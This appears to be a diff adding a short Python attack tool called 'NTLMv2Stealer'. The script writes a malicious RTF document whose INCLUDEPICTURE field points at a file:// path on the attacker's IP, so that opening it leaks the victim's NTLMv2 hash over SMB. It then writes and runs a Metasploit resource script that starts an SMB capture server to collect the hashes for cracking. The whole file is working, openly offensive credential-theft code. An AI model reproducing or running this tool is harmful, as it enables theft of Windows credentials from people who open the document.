@@ -1,0 +1,37 @@
+#!/bin/python3
+
+import os
+import argparse
+
+parser = argparse.ArgumentParser(description='usage: ./NTLMv2Stealer your_local_ip image_path file_name EXAMPLE: ./NTLMv2Stealer 192.168.0.190 iamge.jpg document ')
+parser.add_argument('local_ip', type=str, help='Local IP')
+parser.add_argument('image', type=str, help='Image file path')
+parser.add_argument('name', type=str, help='file name')
+
+args = parser.parse_args()
+
+local_ip = args.local_ip
+image = args.image
+name = args.name
+
+RTF = '{\\rtf1{\\field{\\*\\fldinst {INCLUDEPICTURE '"file://"+local_ip+"/"+image+' \\\\* MERGEFORMAT\\\\d}}{\\fldrslt}}}'
+
+msf_script= f'use auxiliary/server/capture/smb\nset SRVHOST {local_ip}\nset JOHNPWFILE passwords\nrun'
+
+
+def gen():
+    name1 = name + '.rtf'
+    file = open(name1,'w')
+    file.write(RTF)
+    file.close()
+    print(f'[+] generated malicious file {name}')  
+    
+def generateMSFScript():
+	script = open('metasploit.rc','w')
+	script.write(msf_script)
+	script.close()
+	print ('[+] Script Generated Successfully [+]')
+	print ('[+] Running Metasploit Auxiliary Module [+]')
+	os.system('msfconsole -q -r metasploit.rc')
+gen()
+generateMSFScript()   
